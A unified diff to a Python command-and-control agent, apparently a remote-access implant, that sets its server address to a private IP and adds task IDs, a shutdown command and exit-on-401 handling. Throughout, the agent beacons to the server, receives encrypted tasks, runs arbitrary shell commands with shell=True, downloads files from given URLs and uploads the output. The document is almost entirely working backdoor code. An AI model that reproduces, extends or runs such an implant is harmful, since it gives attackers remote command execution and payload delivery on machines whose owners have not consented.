@@ -35,7 +35,7 @@ from cryptography.hazmat.primitives.asymmetric import padding
 # ---------------------------------------------------------------------------
 # Configuration (edit these for your deployment)
 # ---------------------------------------------------------------------------
-SERVER_URL = "http://YOUR.SERVER.IP:5000"
+SERVER_URL = "http://192.168.0.109:5000"
 
 PUBKEY_ENDPOINT   = "/pub"
 REGISTER_ENDPOINT = "/api/register"
@@ -164,6 +164,10 @@ def beacon() -> None:
             headers=_auth_headers(),
             timeout_seconds=10,
         )
+        if response.status_code == 401:
+            print("[!] Unauthorized (401) — agent decommissioned or invalid session. Exiting.")
+            exit(0)
+
         if response.status_code == 200 and response.content:
             data = _decrypt(response.content)
             task = data.get("task")
@@ -175,52 +179,63 @@ def beacon() -> None:
 
 def execute_task(task_data: dict) -> None:
     task_type = task_data.get("type")
+    task_id   = task_data.get("task_id")
     if task_type == "shell":
-        run_shell(task_data.get("command", ""))
+        run_shell(task_data.get("command", ""), task_id)
     elif task_type == "download":
-        download_file(task_data.get("url", ""), task_data.get("save_as", "tmp_dl"))
+        download_file(task_data.get("url", ""), task_data.get("save_as", "tmp_dl"), task_id)
     elif task_type == "sleep":
         global SLEEP_MIN, SLEEP_MAX
         SLEEP_MIN = task_data.get("min", SLEEP_MIN)
         SLEEP_MAX = task_data.get("max", SLEEP_MAX)
+    elif task_type == "shutdown":
+        print("[!] Shutdown command received. Exiting.")
+        exit(0)
     else:
         print(f"[-] Unknown task type: {task_type}")
 
 
-def run_shell(command: str) -> None:
+def run_shell(command: str, task_id: int) -> None:
     if not command:
         return
     try:
         output = subprocess.check_output(
             command, shell=True, stderr=subprocess.STDOUT, timeout=60
         )
-        post_result(output.decode(errors="replace"))
+        post_result(output.decode(errors="replace"), task_id)
     except subprocess.CalledProcessError as e:
-        post_result(e.output.decode(errors="replace"))
+        post_result(e.output.decode(errors="replace"), task_id)
     except Exception as e:
-        post_result(f"[!] Shell error: {e}")
+        post_result(f"[!] Shell error: {e}", task_id)
 
 
-def download_file(url: str, save_as: str) -> None:
+def download_file(url: str, save_as: str, task_id: int) -> None:
     try:
         r = requests.get(url, stream=True, timeout=30)
         with open(save_as, "wb") as f:
             for chunk in r.iter_content(chunk_size=8192):
                 f.write(chunk)
-        post_result(f"[+] Downloaded {url} -> {save_as}")
+        post_result(f"[+] Downloaded {url} -> {save_as}", task_id)
     except Exception as e:
-        post_result(f"[!] Download error: {e}")
+        post_result(f"[!] Download error: {e}", task_id)
 
 
-def post_result(result: str) -> None:
-    payload = _encrypt({"id": AGENT_ID, "output": result})
+def post_result(result: str, task_id: int) -> None:
+    payload = _encrypt({
+        "id": AGENT_ID,
+        "task_id": task_id,
+        "output": result
+    })
     try:
-        _session.post(
+        response = _session.post(
             SERVER_URL + RESULT_ENDPOINT,
             data=payload,
             headers=_auth_headers(),
             timeout_seconds=10,
         )
+        if response.status_code == 401:
+            print("[!] Unauthorized (401) during result upload. Exiting.")
+            exit(0)
     except Exception as e:
         print(f"[!] Result post error: {e}")
 
